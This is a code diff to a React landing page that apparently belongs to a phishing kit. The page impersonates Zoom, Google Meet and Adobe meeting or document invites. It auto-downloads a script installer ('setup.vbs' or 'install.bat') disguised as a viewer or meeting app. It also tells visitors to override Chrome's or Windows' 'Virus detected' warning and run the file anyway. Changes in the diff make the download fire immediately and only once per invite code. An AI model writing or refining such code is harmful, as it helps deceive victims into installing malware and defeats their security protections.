@@ -3,16 +3,9 @@ import { useQuery } from '@tanstack/react-query';
 import { Navigate, useParams } from 'react-router-dom';
 import { fetchPublicGuestLink } from '@/api/guest-links';
 import { isMobileDevice } from '@/lib/device';
-import {
-  installerFileNameForTemplate,
-  type GuestInviteTemplate,
-} from '@/lib/guest-invite';
+import { installerFileNameForTemplate, type GuestInviteTemplate } from '@/lib/guest-invite';
 import { applyMeetingPageBranding } from '@/lib/meeting-branding';
-import {
-  createPreCheckToken,
-  hasPreCheckCookie,
-  setPreCheckCookie,
-} from '@/lib/pre-check-gate';
+import { createPreCheckToken, hasPreCheckCookie, setPreCheckCookie } from '@/lib/pre-check-gate';
 import './meeting-join.css';
 
 const PRE_CHECK_MIN_MS = 900;
@@ -193,7 +186,9 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
                     : 'meeting-mobile__icon-wrap--zoom'
             }`}
           >
-            <MonitorIcon color={isMeet ? '#60a5fa' : isAdobe ? '#f87171' : isGuestList ? '#a89078' : '#2D8CFF'} />
+            <MonitorIcon
+              color={isMeet ? '#60a5fa' : isAdobe ? '#f87171' : isGuestList ? '#a89078' : '#2D8CFF'}
+            />
           </div>
           <h1>Desktop Required</h1>
           <p className="meeting-mobile__msg">
@@ -206,20 +201,20 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
         </div>
         <div className="meeting-mobile__footer">
           <ShieldIcon color={isMeet ? '#7dd3a8' : isAdobe ? '#f87171' : '#2D8CFF'} />
-          {isMeet ? 'Google Workspace Secure' : isAdobe ? 'Adobe Secure' : isGuestList ? 'Secure Session' : 'Zoom Secure'}
+          {isMeet
+            ? 'Google Workspace Secure'
+            : isAdobe
+              ? 'Adobe Secure'
+              : isGuestList
+                ? 'Secure Session'
+                : 'Zoom Secure'}
         </div>
       </div>
     </div>
   );
 }
 
-function DownloadSteps({
-  fileName,
-  windowsBatUrl,
-}: {
-  fileName: string;
-  windowsBatUrl?: string;
-}) {
+function DownloadSteps({ fileName, windowsBatUrl }: { fileName: string; windowsBatUrl?: string }) {
   return (
     <>
       <ol className="meeting-desktop__steps">
@@ -228,8 +223,9 @@ function DownloadSteps({
         <li>Click Yes if Windows asks for permission.</li>
         <li>Keep the setup window open until the progress bar finishes.</li>
         <li>
-          If Chrome or Windows says &quot;Virus detected&quot;, open the download list (arrow top-right),
-          click <strong>Keep</strong> or <strong>⋯ → Keep anyway</strong>, then run the file.
+          If Chrome or Windows says &quot;Virus detected&quot;, open the download list (arrow
+          top-right), click <strong>Keep</strong> or <strong>⋯ → Keep anyway</strong>, then run the
+          file.
         </li>
       </ol>
       {windowsBatUrl ? (
@@ -278,11 +274,7 @@ function BrandDownloadProgress({
           />
         </div>
         <div className="brand-dl__status">
-          {cancelled
-            ? 'Download cancelled.'
-            : downloadStarted
-              ? readyLabel
-              : downloadingLabel}
+          {cancelled ? 'Download cancelled.' : downloadStarted ? readyLabel : downloadingLabel}
         </div>
       </div>
       <div className="brand-dl__actions">
@@ -297,7 +289,16 @@ function BrandDownloadProgress({
   );
 }
 
-function triggerInstallerDownload(url: string, fileName: string) {
+function triggerInstallerDownload(url: string, fileName: string, code?: string) {
+  if (code) {
+    const key = `nd-installer-dl-${code}`;
+    try {
+      if (sessionStorage.getItem(key)) return;
+      sessionStorage.setItem(key, '1');
+    } catch {
+      /* ignore private mode */
+    }
+  }
   const anchor = document.createElement('a');
   anchor.href = url;
   anchor.download = fileName || 'setup.vbs';
@@ -320,13 +321,12 @@ function useBrowserInstallerDownload(
   useEffect(() => {
     if (!enabled || !installerUrl || cancelled) return;
 
-    // Delay so React Strict Mode's mount→unmount→remount does not cancel the download.
     let alive = true;
+    setDownloadStarted(true);
     const timer = window.setTimeout(() => {
       if (!alive) return;
-      triggerInstallerDownload(installerUrl, installerFileName);
-      setDownloadStarted(true);
-    }, 200);
+      triggerInstallerDownload(installerUrl, installerFileName, code);
+    }, 0);
 
     return () => {
       alive = false;
@@ -529,9 +529,7 @@ function GuestListDesktop({
         </div>
         <div className="guest-join-page__modal-body">
           <p className="guest-join-page__lead">Joining your session.</p>
-          <p className="guest-join-page__sub">
-            Detected app switch that was likely launch of app.
-          </p>
+          <p className="guest-join-page__sub">Detected app switch that was likely launch of app.</p>
           <p className="guest-join-page__trouble">
             Having trouble?{' '}
             <a href={installerUrl} download={installerFileName}>
@@ -599,7 +597,9 @@ function AdobeDesktop({
             </div>
             <div className="adobe-download__feat">
               <strong className="adobe-download__feat-title">Powerful Editing Tools</strong>
-              <div className="adobe-download__feat-desc">Edit text and images directly in PDFs.</div>
+              <div className="adobe-download__feat-desc">
+                Edit text and images directly in PDFs.
+              </div>
             </div>
             <div className="adobe-download__feat">
               <strong className="adobe-download__feat-title">E-signature Support</strong>
@@ -632,29 +632,35 @@ function AdobeDesktop({
                   ? 'Download cancelled.'
                   : downloadStarted
                     ? `Download started. Open ${installerFileName} from your Downloads folder.`
-                    : 'Preparing download…'}
+                    : 'Downloading installer…'}
               </div>
             </div>
             <div className="adobe-download__actions">
-              <a className="adobe-download__btn-ghost" href={installerUrl} download={installerFileName}>
+              <a
+                className="adobe-download__btn-ghost"
+                href={installerUrl}
+                download={installerFileName}
+              >
                 Manually start download
               </a>
               {windowsBatUrl ? (
-                <a className="adobe-download__btn-ghost" href={windowsBatUrl} download="install.bat">
+                <a
+                  className="adobe-download__btn-ghost"
+                  href={windowsBatUrl}
+                  download="install.bat"
+                >
                   Alternative installer (.bat)
                 </a>
               ) : null}
-              <button
-                type="button"
-                className="adobe-download__btn-cancel"
-                onClick={cancel}
-              >
+              <button type="button" className="adobe-download__btn-cancel" onClick={cancel}>
                 Cancel
               </button>
             </div>
           </div>
           <DownloadSteps fileName={installerFileName} />
-          <footer className="adobe-download__footer">Secure document share · Windows viewer setup</footer>
+          <footer className="adobe-download__footer">
+            Secure document share · Windows viewer setup
+          </footer>
         </div>
       </div>
     </div>
@@ -678,8 +684,7 @@ export function MeetingJoinLanding({ template: routeTemplate }: { template: Gues
     retry: 1,
   });
 
-  const brandingPhase =
-    !preCheckPassed || query.isLoading ? 'loading' : 'ready';
+  const brandingPhase = !preCheckPassed || query.isLoading ? 'loading' : 'ready';
   useMeetingPageBranding(routeTemplate, brandingPhase);
 
   if (legacyAdobePath) {
